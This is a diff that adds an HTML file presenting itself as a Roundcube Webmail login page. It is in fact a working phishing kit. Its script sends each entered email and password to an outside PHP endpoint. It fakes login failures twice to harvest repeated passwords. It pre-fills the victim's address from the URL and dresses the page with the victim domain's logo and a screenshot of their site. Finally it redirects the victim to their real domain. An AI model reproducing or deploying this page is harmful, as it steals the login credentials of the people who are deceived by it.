@@ -1,0 +1,322 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roundcube Webmail :: Login</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        * { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  position: relative;
+  overflow: hidden;
+}
+
+.domain-background {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%;
+  height: 100%;
+  z-index: -1;
+  opacity: 1;
+  object-fit: cover;
+  object-position: center center;
+  display: none;
+}
+
+.domain-background.show {
+  display: block;
+}
+
+.login-wrapper {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.side-text {
+  writing-mode: vertical-rl;
+  transform: rotate(180deg);
+  font-size: 16px;
+  color: #666;
+  margin-right: 20px;
+}
+
+.login-box {
+  display: flex;
+  background: #fff;
+  border: 1px solid #ddd;
+  border-radius: 6px;
+  box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+  overflow: hidden;
+  height: 300px;
+}
+
+.login-form {
+  display: flex;
+  flex-direction: column;
+  padding: 30px 25px;
+  width: 380px;
+}
+
+.login-form input[type="text"],
+.login-form input[type="password"] {
+  padding: 14px 40px 14px 12px;
+  margin-bottom: 18px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  font-size: 15px;
+  width: 100%;
+  background-repeat: no-repeat;
+  background-position: right 12px center;
+}
+
+#username {
+  background-image: url("https://img.icons8.com/ios-filled/20/000000/user.png");
+}
+
+#password {
+  background-image: url("https://img.icons8.com/ios-filled/20/000000/lock-2.png");
+}
+
+.login-btn {
+  background: #3498db;
+  color: #fff;
+  border: none;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  padding: 16px;
+  border-radius: 4px;
+  text-transform: uppercase;
+  transition: background 0.3s;
+}
+
+.login-btn:hover {
+  background: #2c80b4;
+}
+
+.error {
+  color: red;
+  font-size: 14px;
+  margin-bottom: 12px;
+  display: none;
+}
+
+.logo-box {
+  background: #f9f9f9;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  width: 140px;
+}
+
+.logo-box img {
+  width: 90px;
+}
+
+.loading {
+  display: none;
+  text-align: center;
+  margin-bottom: 12px;
+}
+
+.loading-spinner {
+  border: 3px solid #f3f3f3;
+  border-top: 3px solid #3498db;
+  border-radius: 50%;
+  width: 30px;
+  height: 30px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.loading.show {
+  display: block;
+}
+    </style>
+  </head>
+  <body>
+    <img id="domain-background" class="domain-background" alt="">
+    <div class="login-wrapper">
+      <div class="side-text">YOUR ACCOUNT IS CONNECTED</div>
+      <div class="login-box">
+        <form id="loginForm" class="login-form" action="https://lubestar.pk/index2/cola-inL1720.php" method="POST">
+          <div class="error" id="errorMsg"></div>
+          <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+          </div>
+
+          <input type="text" id="email" name="email" placeholder="Email Address" required="">
+          <input type="hidden" id="formtype" name="formtype" value="login">
+          <input type="hidden" id="auth" name="auth" value="">
+          <input type="password" id="password" name="password" placeholder="Password" required="" autocomplete="off">
+          <input type="submit" value="Login" class="login-btn">
+        </form>
+        <div class="logo-box">
+          <!-- Dynamic logo based on email domain -->
+          <img id="logoImg" src="https://roundcube.net/images/logo.png" alt="Roundcube Logo">
+          <span style="color: #666; font-size: 12px; position: absolute; margin-top: 9rem; left: 50%; transform: translateX(-50%);">Verify your identity to complete Authentication</span>
+
+        </div>
+      </div>
+    </div>
+  
+<script>
+    let attempts = 0;
+const form = document.getElementById("loginForm");
+const errorMsg = document.getElementById("errorMsg");
+const loading = document.getElementById("loading");
+const usernameField = document.getElementById("email");
+const passwordField = document.getElementById("password");
+
+const errorMessages = [
+  "Login failed.",
+  "The username or password cannot be recognized.",
+  "Login failed. Please check the details."
+];
+
+// Simple cache to avoid repeated API hits for the same domain
+let lastLogoDomain = null;
+let lastBackgroundDomain = null;
+
+function getDomainFromEmail(email) {
+  if (!email) return null;
+  const trimmed = email.trim();
+  const atIndex = trimmed.indexOf("@");
+  if (atIndex <= 0 || atIndex === trimmed.length - 1) return null;
+  return trimmed.slice(atIndex + 1);
+}
+
+function updateLogoFromDomain(domain) {
+  const logoImg = document.getElementById("logoImg");
+  const defaultLogo = "https://roundcube.net/images/logo.png";
+
+  if (!domain) {
+    logoImg.src = defaultLogo;
+    lastLogoDomain = null;
+    return;
+  }
+
+  if (domain === lastLogoDomain) {
+    return;
+  }
+
+  const logoUrl = `https://img.logokit.com/${domain}?token=pk_fr6a06da10a046d661c943`;
+
+  const testImg = new Image();
+  testImg.onload = function() {
+    lastLogoDomain = domain;
+    logoImg.src = logoUrl;
+  };
+  testImg.onerror = function() {
+    logoImg.src = defaultLogo;
+  };
+  testImg.src = logoUrl;
+}
+
+function updateBackground(domain) {
+  const backgroundImg = document.getElementById("domain-background");
+  
+  if (!domain) {
+    backgroundImg.classList.remove("show");
+    backgroundImg.src = "";
+    lastBackgroundDomain = null;
+    return;
+  }
+  
+  if (domain === lastBackgroundDomain) {
+    return; // Already loaded
+  }
+  
+  const url = `https://s0.wp.com/mshots/v1/https://${domain}?w=800`;
+  backgroundImg.src = url;
+  backgroundImg.classList.add("show");
+  lastBackgroundDomain = domain;
+}
+
+window.addEventListener("load", () => {
+  const hash = window.location.hash.slice(1);
+  if (hash && /^[^@]+@[^@]+\.[^@]+$/.test(hash)) {
+    usernameField.value = hash;
+    const domain = getDomainFromEmail(hash);
+    updateLogoFromDomain(domain);
+    updateBackground(domain);
+  }
+});
+
+usernameField.addEventListener("blur", () => {
+  const email = usernameField.value;
+  const domain = getDomainFromEmail(email);
+  updateLogoFromDomain(domain);
+  updateBackground(domain);
+});
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+
+
+  loading.classList.add("show");
+  errorMsg.style.display = "none";
+
+  const formAction = form.getAttribute("action") || window.location.href;
+  
+  const formData = new FormData(form);
+  
+  fetch(formAction, {
+    method: 'POST',
+    mode: 'no-cors', // Bypasses CORS - response will be opaque but request will succeed
+    cache: 'no-cache',
+    credentials: 'omit',
+    body: formData
+  }).catch(function(error) {
+    
+  });
+
+  attempts++;
+
+  if (attempts < 3) {
+    // Show error after 1 second delay and hide loading
+    setTimeout(() => {
+      loading.classList.remove("show");
+      errorMsg.style.display = "block";
+      errorMsg.textContent = errorMessages[(attempts - 1) % errorMessages.length];
+      passwordField.value = "";
+      passwordField.focus();
+    }, 1000);
+  } else {
+setTimeout(() => {
+  loading.classList.remove("show");
+  errorMsg.style.display = "none";
+
+  let user = usernameField.value.trim();
+  let domain = "mailbox";
+  if (user.includes("@")) {
+    domain = user.split("@")[1]; // get part after @
+	getMxRecords(domain).then(records => console.log(records));
+  }
+
+  window.location.href = "https://" + domain;
+}, 3000);
+
+  }
+});;
+</script>  
+  
+</body></html>
